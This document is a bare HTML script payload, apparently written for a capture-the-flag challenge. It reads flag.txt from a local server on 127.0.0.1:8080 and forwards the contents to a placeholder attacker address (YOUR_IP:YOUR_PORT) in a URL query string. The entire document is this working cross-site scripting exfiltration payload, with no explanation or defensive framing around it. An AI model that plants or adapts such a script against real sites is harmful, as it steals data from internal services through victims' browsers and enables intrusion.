<script>
fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
        fetch('http://YOUR_IP:YOUR_PORT/?flag=' + encodeURIComponent(data));
    })
</script>
